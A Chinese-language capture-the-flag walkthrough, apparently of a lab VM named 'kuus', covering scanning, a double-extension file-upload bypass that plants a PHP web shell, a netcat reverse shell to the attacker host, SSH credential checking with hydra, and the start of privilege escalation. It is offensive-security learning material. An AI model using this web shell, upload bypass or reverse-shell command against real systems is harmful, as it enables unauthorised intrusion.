做virtualBox的端口映射吧
# 服务扫描

```c
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sV -A -T 4 -p 22,80 192.168.18.238

```
# GetSHell
访问80http://192.168.18.238/
文件上传，白名单限制,只允许图片格式,使用1.php.jpg的方式绕过文件上传，原因可能是因为后端只取点后的第一个后缀进行解析。
```css
POST /upload.php HTTP/1.1

Host: 192.168.18.238

User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate, br

Content-Type: multipart/form-data; boundary=---------------------------58834982911681499741555270890

Content-Length: 365

Origin: http://192.168.18.238

Connection: close

Referer: http://192.168.18.238/

Upgrade-Insecure-Requests: 1



-----------------------------58834982911681499741555270890

Content-Disposition: form-data; name="photo"; filename="1.php.jpg"

Content-Type: image/png



<?php system($_GET['cmd']);?>

-----------------------------58834982911681499741555270890

Content-Disposition: form-data; name="submit"



Upload

-----------------------------58834982911681499741555270890--
```

访问http://192.168.18.238/upload/1.php.jpg?cmd=id

反弹shell
```css
http://192.168.18.238/upload/1.php.jpg?cmd=nc%20-e%20/bin/bash%20192.168.44.128%209001


┌──(kali㉿kali)-[~]
└─$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [192.168.44.128] from (UNKNOWN) [192.168.44.10] 4854
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
script /dev/null -c bash
Script started, file is /dev/null
www-data@kuus:/var/www/html/upload$ 

```

# 提权
tignasse 账号下有个.pass.txt 文件，但是经过测试并没有用
尝试常规的sudo\suid\内核\任务计划\进程分析手段、爆破了一段时间之后,也没结果。实在不想浪费时间了，看了别人的writeup，才知道。这里密码另有隐情！
```c
www-data@kuus:/home$ ls
ls
mister_b  tignasse

www-data@kuus:/home/tignasse$ more .pass.txt
more .pass.txt
716n4553
www-data@kuus:/home/tignasse$ cat .pass.txt
cat .pass.txt
Try harder !

```

hydra
```c
hydra -l tignasse -p 716n4553 ssh://192.168.18.238

[22][ssh] host: 192.168.18.238   login: tignasse   password: 716n4553
```

ssh
```c
┌──(kali㉿kali)-[~]
└─$ sudo ssh tignasse@192.168.18.238

tignasse@kuus:~$ sudo -l
    (mister_b) NOPASSWD: /usr/bin/python /opt/games/game.py

```